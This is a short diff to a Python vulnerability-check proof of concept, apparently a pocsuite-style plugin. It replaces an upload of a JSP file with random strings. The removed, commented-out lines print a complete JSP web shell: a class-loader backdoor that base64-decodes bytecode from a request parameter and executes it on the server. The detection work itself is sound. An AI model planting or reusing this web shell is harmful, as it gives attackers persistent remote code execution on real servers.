@@ -52,38 +52,7 @@ class POC(POCBase):
                             }
         filename = random_str()
         filecontent = random_str()
-#         filecontent = """
-# <%!
-# class ON extends ClassLoader{
-#   ON(ClassLoader c){super(c);}
-#   public Class qualified(byte[] b){
-#     return super.defineClass(b, 0, b.length);
-#   }
-# }
-# public byte[] interacts(String str) throws Exception {
-#   Class base64;
-#   byte[] value = null;
-#   try {
-#     base64=Class.forName("sun.misc.BASE64Decoder");
-#     Object decoder = base64.newInstance();
-#     value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
-#   } catch (Exception e) {
-#     try {
-#       base64=Class.forName("java.util.Base64");
-#       Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
-#       value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
-#     } catch (Exception ee) {}
-#   }
-#   return value;
-# }
-# %>
-# <%
-# String cls = request.getParameter("123");
-# if (cls != null) {
-#   new ON(this.getClass().getClassLoader()).qualified(interacts(cls)).newInstance().equals(new Object[]{request,response});
-# }
-# %>
-# """
+
         try:
             """
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
